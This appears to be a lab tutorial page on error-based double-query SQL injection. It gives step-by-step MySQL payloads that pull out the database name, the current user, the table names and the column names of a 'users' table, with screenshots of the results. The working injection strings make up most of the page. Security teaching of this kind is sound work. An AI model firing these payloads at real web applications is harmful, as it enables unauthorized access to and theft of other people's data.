---
type: page
title: "SQL Injection Lab – Lesson 2 (Double Query Injection)"

draft: false
tags: ["SQL Injection", "Double Query Injection", "Web Security", "Labs"]
categories: ["Learning", "Web Security", "SQLi"]
# Add these lines to hide from lists:
_build:
  list: never
  render: true
---
type: page


# Double Query (Sub-Query) Injection

# Inject parameter
1. Look for parameters placed inside single quotes: `id='...`  
2. Confirm the app shows errors or returns a page that changes on bad input (even if message hidden — error may still be logged).  

If the response changes, parameter is injectable. If you get SQL error, good — proceed carefully.

## Dumping database name

Payload:

```sql
1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b) --+
```
if error shows ***DataBase name***, you succeeded.
![Alt text](/sqli-02/ss1.jpg)

## Dumping current-user 

Payload:

```sql
1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select current_user()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b) --+
```

you can see the ***current_user*** in the error.

![Alt text](/sqli-02/ss2.jpg)

## Dumping tables

Payloads:

```sql
1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
```
you can see the ***tables*** in error.

![Alt text](/sqli-02/ss3.jpg)

```sql 
1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 1,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
```

![Alt text](/sqli-02/ss4.jpg)

```sql
1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 2,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
```

![Alt text](/sqli-02/ss5.jpg)

```sql
1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 3,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
```

![Alt text](/sqli-02/ss6.jpg)

## Dumping data from tables
Payload:

```sql 
1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
```

![Alt text](/sqli-02/ss7.jpg)

You can dump more data by changing the ***limit*** in querry.
